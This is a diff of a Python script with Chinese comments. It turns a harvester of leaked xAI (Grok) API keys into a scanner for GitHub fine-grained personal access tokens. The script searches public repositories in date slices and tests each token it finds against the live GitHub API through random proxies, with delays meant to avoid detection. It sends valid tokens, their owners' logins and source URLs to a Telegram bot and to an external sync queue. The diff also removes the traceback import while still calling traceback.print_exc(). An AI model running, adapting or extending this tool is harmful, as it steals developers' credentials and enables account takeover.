@@ -3,15 +3,11 @@ import random
 import re
 import sys
 import time
-import traceback
 import threading
 import requests
 from datetime import datetime, timedelta
-from typing import Dict, List, Union, Any
+from typing import Dict, List, Any
 from http.server import BaseHTTPRequestHandler, HTTPServer
-
-# 已移除 Google 生成式 AI 相关依赖，改用通用 HTTP 请求
-# import google.generativeai as genai
 
 from common.Logger import logger
 
@@ -21,20 +17,12 @@ from utils.github_client import GitHubClient
 from utils.file_manager import file_manager, Checkpoint, checkpoint
 from utils.sync_utils import sync_utils
 
-# --- Telegram 定时发送相关变量 ---
+# --- 状态与汇总变量 ---
 LAST_TG_SEND_TIME = time.time()
-PENDING_KEYS_TO_SEND = []
+PENDING_TOKENS_TO_SEND = []
 
-# 创建GitHub工具实例和文件管理器
+# 创建GitHub工具实例
 github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)
-
-# 统计信息
-skip_stats = {
-    "time_filter": 0,
-    "sha_duplicate": 0,
-    "age_filter": 0,
-    "doc_filter": 0
-}
 
 # --- 健康检查 Web 服务类 (适配 Koyeb) ---
 class HealthCheckHandler(BaseHTTPRequestHandler):
@@ -44,7 +32,7 @@ class HealthCheckHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b"OK")
     def log_message(self, format, *args):
-        return  # 禁用日志记录以保持控制台整洁
+        return  # 禁用日志记录
 
 def start_health_check_server():
     port = int(os.environ.get("PORT", 8000))
@@ -54,25 +42,25 @@ def start_health_check_server():
 
 # --- Telegram 汇总发送函数 ---
 def send_telegram_summary():
-    global LAST_TG_SEND_TIME, PENDING_KEYS_TO_SEND
-    
+    global LAST_TG_SEND_TIME, PENDING_TOKENS_TO_SEND
     token = os.getenv("TG_BOT_TOKEN")
     chat_id = os.getenv("TG_CHAT_ID")
     
-    if not token or not chat_id or not PENDING_KEYS_TO_SEND:
-        PENDING_KEYS_TO_SEND = []
+    if not token or not chat_id or not PENDING_TOKENS_TO_SEND:
+        PENDING_TOKENS_TO_SEND = []
         LAST_TG_SEND_TIME = time.time()
         return
 
-    header = f"📊 【Grok 抓取汇总】\n"
+    header = f"📊 【GitHub PAT 专项扫描汇总】\n"
     header += f"⏰ 时间: {datetime.now().strftime('%m-%d %H:%M')}\n"
-    header += f"✨ 新发现有效 xAI Key: {len(PENDING_KEYS_TO_SEND)} 个\n\n"
+    header += f"✨ 新发现有效 Token: {len(PENDING_TOKENS_TO_SEND)} 个\n\n"
     
-    all_keys_text = "\n".join(PENDING_KEYS_TO_SEND)
+    all_keys_text = "\n".join(PENDING_TOKENS_TO_SEND)
     full_message = header + all_keys_text
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     
     try:
+        # 分段处理长消息
         MAX_LENGTH = 3500 
         if len(full_message) <= MAX_LENGTH:
             requests.post(url, json={"chat_id": chat_id, "text": full_message}, timeout=15)
@@ -82,197 +70,93 @@ def send_telegram_summary():
                 msg_text = f"📦 部分 {index+1}/{len(parts)}：\n\n" + part
                 requests.post(url, json={"chat_id": chat_id, "text": msg_text}, timeout=15)
                 time.sleep(1) 
-                
-        logger.info(f"📤 已向 Telegram 发送汇总报告，共计 {len(PENDING_KEYS_TO_SEND)} 个 Key")
+        logger.info(f"📤 已向 Telegram 发送汇总报告")
     except Exception as e:
         logger.error(f"❌ Telegram 发送失败: {e}")
     
-    PENDING_KEYS_TO_SEND = []
+    PENDING_TOKENS_TO_SEND = []
     LAST_TG_SEND_TIME = time.time()
 
-
-def normalize_query(query: str) -> str:
-    query = " ".join(query.split())
-    parts = []
-    i = 0
-    while i < len(query):
-        if query[i] == '"':
-            end_quote = query.find('"', i + 1)
-            if end_quote != -1:
-                parts.append(query[i:end_quote + 1])
-                i = end_quote + 1
-            else:
-                parts.append(query[i])
-                i += 1
-        elif query[i] == ' ':
-            i += 1
-        else:
-            start = i
-            while i < len(query) and query[i] != ' ':
-                i += 1
-            parts.append(query[start:i])
-
-    quoted_strings = []
-    language_parts = []
-    filename_parts = []
-    path_parts = []
-    other_parts = []
-
-    for part in parts:
-        if part.startswith('"') and part.endswith('"'):
-            quoted_strings.append(part)
-        elif part.startswith('language:'):
-            language_parts.append(part)
-        elif part.startswith('filename:'):
-            filename_parts.append(part)
-        elif part.startswith('path:'):
-            path_parts.append(part)
-        elif part.strip():
-            other_parts.append(part)
-
-    normalized_parts = sorted(quoted_strings) + sorted(other_parts) + sorted(language_parts) + sorted(filename_parts) + sorted(path_parts)
-    return " ".join(normalized_parts)
-
-
-def extract_keys_from_content(content: str) -> List[str]:
-    # 修改正则以匹配 xAI 的 Key (前缀通常为 xai-)
-    pattern = r'(xai-[a-zA-Z0-9\-_]{30,})'
-    return re.findall(pattern, content)
-
-
-def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
-    if checkpoint.last_scan_time:
-        try:
-            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
-            repo_pushed_at = item["repository"].get("pushed_at")
-            if repo_pushed_at:
-                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
-                if repo_pushed_dt <= last_scan_dt:
-                    skip_stats["time_filter"] += 1
-                    return True, "time_filter"
-        except Exception:
-            pass
-
-    if item.get("sha") in checkpoint.scanned_shas:
-        skip_stats["sha_duplicate"] += 1
-        return True, "sha_duplicate"
-
-    repo_pushed_at = item["repository"].get("pushed_at")
-    if repo_pushed_at:
-        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
-        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
-            skip_stats["age_filter"] += 1
-            return True, "age_filter"
-
-    lowercase_path = item["path"].lower()
-    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
-        skip_stats["doc_filter"] += 1
-        return True, "doc_filter"
-
-    return False, ""
-
-
-def process_item(item: Dict[str, Any]) -> tuple:
-    delay = random.uniform(1, 4)
-    file_url = item["html_url"]
-    repo_name = item["repository"]["full_name"]
-    file_path = item["path"]
-    time.sleep(delay)
-
-    content = github_utils.get_file_content(item)
-    if not content:
-        logger.warning(f"⚠️ Failed to fetch content for file: {file_url}")
-        return 0, 0
-
-    keys = extract_keys_from_content(content)
-    filtered_keys = []
-    for key in keys:
-        context_index = content.find(key)
-        if context_index != -1:
-            snippet = content[context_index:context_index + 45]
-            if "..." in snippet or "YOUR_" in snippet.upper():
-                continue
-        filtered_keys.append(key)
-    
-    keys = list(set(filtered_keys))
-    if not keys:
-        return 0, 0
-
-    logger.info(f"🔑 Found {len(keys)} suspected Grok key(s), validating...")
-
-    valid_keys = []
-    rate_limited_keys = []
-
-    for key in keys:
-        validation_result = validate_grok_key(key)
-        if validation_result == "ok":
-            valid_keys.append(key)
-            logger.info(f"✅ VALID: {key}")
-        elif "rate_limited" in validation_result:
-            rate_limited_keys.append(key)
-            logger.warning(f"⚠️ RATE LIMITED: {key}")
-        else:
-            logger.info(f"❌ INVALID: {key}, result: {validation_result}")
-
-    if valid_keys:
-        file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
-        PENDING_KEYS_TO_SEND.extend(valid_keys)
-        try:
-            sync_utils.add_keys_to_queue(valid_keys)
-            logger.info(f"📥 Added {len(valid_keys)} key(s) to sync queues")
-        except Exception as e:
-            logger.error(f"📥 Sync error: {e}")
-
-    if rate_limited_keys:
-        file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)
-
-    return len(valid_keys), len(rate_limited_keys)
-
-
-def validate_grok_key(api_key: str) -> str:
-    """验证 Grok (xAI) API Key 的有效性"""
+# --- GitHub PAT 验证函数 ---
+def validate_github_token(token: str) -> str:
+    """验证 GitHub Token 的有效性"""
     try:
-        time.sleep(random.uniform(0.5, 1.5))
-        url = "https://api.x.ai/v1/chat/completions"
+        # 使用 Config 中预设的验证地址：https://api.github.com/user
+        url = Config.GITHUB_API_URL
         headers = {
-            "Authorization": f"Bearer {api_key}",
-            "Content-Type": "application/json"
-        }
-        data = {
-            "messages": [{"role": "user", "content": "hi"}],
-            "model": Config.HAJIMI_CHECK_MODEL,
-            "max_tokens": 5
+            "Authorization": f"token {token}",
+            "Accept": "application/vnd.github.v3+json"
         }
         
+        # 随机延迟避免被风控
+        time.sleep(random.uniform(0.5, 1.5))
         proxies = Config.get_random_proxy()
-        response = requests.post(url, json=data, headers=headers, proxies=proxies, timeout=15)
+        
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=15)
 
         if response.status_code == 200:
-            return "ok"
+            user_info = response.json()
+            user_login = user_info.get("login", "Unknown")
+            return f"ok_user_{user_login}"
         elif response.status_code == 401:
             return "unauthorized"
-        elif response.status_code == 429:
-            return "rate_limited"
+        elif response.status_code == 403:
+            return "forbidden_or_rate_limited"
         else:
             return f"error_{response.status_code}"
     except Exception as e:
         return f"exception_{type(e).__name__}"
 
+def process_item(item: Dict[str, Any]) -> tuple:
+    """处理 GitHub 搜索结果项"""
+    file_url = item["html_url"]
+    repo_name = item["repository"]["full_name"]
+    file_path = item["path"]
+
+    content = github_utils.get_file_content(item)
+    if not content:
+        return 0, 0
+
+    # 提取 Fine-grained PAT ( github_pat_ 开头的 82 位字符 )
+    tokens = re.findall(r'(github_pat_[a-zA-Z0-9]{82})', content)
+    unique_tokens = list(set(tokens))
+    
+    if not unique_tokens:
+        return 0, 0
+
+    valid_count = 0
+    for tk in unique_tokens:
+        logger.info(f"🔑 Found potential PAT: {tk[:15]}..., validating...")
+        result = validate_github_token(tk)
+        
+        if result.startswith("ok"):
+            valid_count += 1
+            logger.info(f"✅ VALID PAT: {tk[:15]}... ({result})")
+            # 保存到本地文件
+            file_manager.save_valid_keys(repo_name, file_path, file_url, [tk])
+            # 添加到 TG 发送列表
+            PENDING_TOKENS_TO_SEND.append(f"TOKEN: {tk}\nUSER: {result.replace('ok_user_', '')}\nFROM: {file_url}\n")
+            # 同步到外部负载均衡器 (复用原来的 GROK 通道)
+            try:
+                sync_utils.add_keys_to_queue([tk])
+            except: pass
+        else:
+            logger.info(f"❌ INVALID PAT: {tk[:15]}... (Result: {result})")
+
+    return valid_count, 0
 
 def main():
+    # 启动健康检查服务
     threading.Thread(target=start_health_check_server, daemon=True).start()
     
-    start_time = datetime.now()
     logger.info("=" * 60)
-    logger.info("🚀 HAJIMI KING [GROK EDITION] STARTING")
+    logger.info("🚀 GITHUB PAT DEEP SCANNER STARTING")
     logger.info("=" * 60)
 
     if not Config.check() or not file_manager.check():
         sys.exit(1)
 
     search_queries = file_manager.get_search_queries()
-    total_keys_found = 0
-    total_rate_limited_keys = 0
     loop_count = 0
 
     while True:
@@ -280,57 +164,54 @@ def main():
             loop_count += 1
             logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")
 
-            # 每一轮循环重置已处理查询，确保持续扫描更新
+            # 重置本轮扫描状态
             checkpoint.processed_queries = set()
 
-            loop_processed_files = 0
-            for i, q in enumerate(search_queries, 1):
-                normalized_q = normalize_query(q)
-                if normalized_q in checkpoint.processed_queries:
-                    continue
-
-                res = github_utils.search_for_keys(q)
-                if res and "items" in res:
-                    items = res["items"]
-                    query_valid = 0
-                    query_429 = 0
-
-                    for item_index, item in enumerate(items, 1):
-                        if item_index % 20 == 0:
+            for q in search_queries:
+                # === 深度扫描逻辑：时间切片分段扫描 ===
+                end_dt = datetime.now()
+                # 按照 Config 中的回溯天数计算起点
+                start_dt = end_dt - timedelta(days=Config.DATE_RANGE_DAYS)
+                
+                curr_end = end_dt
+                while curr_end > start_dt:
+                    # 步长由 Config.DEEP_SCAN_INTERVAL_DAYS 控制
+                    curr_start = curr_end - timedelta(days=Config.DEEP_SCAN_INTERVAL_DAYS)
+                    date_filter = f"created:{curr_start.strftime('%Y-%m-%d')}..{curr_end.strftime('%Y-%m-%d')}"
+                    
+                    # 组合最终的强力扫描指令 (Keyword + Global Exclude + Date Filter)
+                    full_q = f"{q} {Config.GLOBAL_EXCLUDE_DORK} {date_filter}"
+                    
+                    logger.info(f"🔍 [Scanning] {full_q}")
+                    res = github_utils.search_for_keys(full_q)
+                    
+                    if res and "items" in res:
+                        items = res["items"]
+                        for item in items:
+                            # SHA 去重过滤
+                            if item.get("sha") in checkpoint.scanned_shas:
+                                continue
+                            
+                            process_item(item)
+                            checkpoint.add_scanned_sha(item.get("sha"))
+                            
+                            # 每处理一页保存一次进度
                             file_manager.save_checkpoint(checkpoint)
-                            file_manager.update_dynamic_filenames()
 
-                        should_skip, _ = should_skip_item(item, checkpoint)
-                        if should_skip:
-                            continue
+                    curr_end = curr_start
+                    time.sleep(2) # 礼貌延迟
 
-                        v, r = process_item(item)
-                        query_valid += v
-                        query_429 += r
-                        checkpoint.add_scanned_sha(item.get("sha"))
-                        loop_processed_files += 1
+                # 每一条主 query 处理完后，检查是否需要发送 TG 汇总
+                if time.time() - LAST_TG_SEND_TIME >= 3600:
+                    send_telegram_summary()
 
-                    total_keys_found += query_valid
-                    total_rate_limited_keys += query_429
-                    logger.info(f"✅ Query {i}/{len(search_queries)}: Found {query_valid} valid")
+            logger.info(f"🏁 Loop #{loop_count} complete. Sleeping...")
+            time.sleep(60)
 
-                checkpoint.add_processed_query(normalized_q)
-                checkpoint.update_scan_time()
-                file_manager.save_checkpoint(checkpoint)
-
-            # 检查 Telegram 汇总发送
-            if time.time() - LAST_TG_SEND_TIME >= 3600:
-                send_telegram_summary()
-
-            logger.info(f"🏁 Loop #{loop_count} done. Sleeping...")
-            time.sleep(10)
-
-        except KeyboardInterrupt:
-            sync_utils.shutdown()
-            break
         except Exception as e:
-            logger.error(f"💥 Loop Error: {e}")
-            time.sleep(10)
+            logger.error(f"💥 Runtime Error: {e}")
+            traceback.print_exc()
+            time.sleep(30)
 
 if __name__ == "__main__":
     main()
